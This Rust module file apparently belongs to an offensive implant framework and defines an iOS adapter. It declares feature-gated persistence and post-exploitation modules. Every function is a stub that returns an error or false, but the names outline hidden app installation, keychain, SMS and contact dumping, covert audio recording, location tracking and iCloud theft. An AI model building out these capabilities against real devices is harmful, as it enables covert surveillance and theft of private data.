//! iOS platform adapter module.
//!
//! Provides iOS-specific implementations of the platform abstraction
//! traits: environment validation, persistence, post-exploitation, and
//! Objective-C bridge helpers.

pub mod bridge;
pub mod env_checks;

// Persistence and post-exploitation modules require `mobile-postexp` feature.
// When absent, stubs return clear error messages rather than panicking.
#[cfg(all(target_os = "ios", feature = "mobile-postexp"))]
pub mod persistence;

#[cfg(all(target_os = "ios", not(feature = "mobile-postexp")))]
pub mod persistence {
    //! Stub — enable `mobile-postexp` feature for iOS persistence.
    use anyhow::Result;
    pub fn install_launchd() -> Result<()> {
        Err(anyhow::anyhow!(
            "iOS persistence requires the `mobile-postexp` feature"
        ))
    }
    pub fn install_service_management() -> Result<()> {
        Err(anyhow::anyhow!(
            "iOS persistence requires the `mobile-postexp` feature"
        ))
    }
    pub fn remove_launchd() -> Result<()> {
        Err(anyhow::anyhow!(
            "iOS persistence requires the `mobile-postexp` feature"
        ))
    }
    pub fn check_persistence() -> Result<bool> {
        Ok(false)
    }
    pub fn install_hidden_app() -> Result<()> {
        Err(anyhow::anyhow!(
            "iOS persistence requires the `mobile-postexp` feature"
        ))
    }
}

#[cfg(all(target_os = "ios", feature = "mobile-postexp"))]
pub mod post_exploitation;

#[cfg(all(target_os = "ios", not(feature = "mobile-postexp")))]
pub mod post_exploitation {
    //! Stub — enable `mobile-postexp` feature for iOS post-exploitation.
    use anyhow::Result;
    pub fn dump_keychain() -> Result<String> {
        Err(anyhow::anyhow!(
            "iOS post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn dump_contacts() -> Result<String> {
        Err(anyhow::anyhow!(
            "iOS post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn dump_sms() -> Result<String> {
        Err(anyhow::anyhow!(
            "iOS post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn dump_call_log() -> Result<String> {
        Err(anyhow::anyhow!(
            "iOS post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn list_installed_apps() -> Result<String> {
        Err(anyhow::anyhow!(
            "iOS post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn take_screenshot() -> Result<Vec<u8>> {
        Err(anyhow::anyhow!(
            "iOS post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn record_audio(_duration_secs: u64) -> Result<Vec<u8>> {
        Err(anyhow::anyhow!(
            "iOS post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn get_location() -> Result<String> {
        Err(anyhow::anyhow!(
            "iOS post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn read_clipboard() -> Result<String> {
        Err(anyhow::anyhow!(
            "iOS post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn enumerate_accounts() -> Result<String> {
        Err(anyhow::anyhow!(
            "iOS post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn icloud_data() -> Result<String> {
        Err(anyhow::anyhow!(
            "iOS post-exploitation requires the `mobile-postexp` feature"
        ))
    }
}
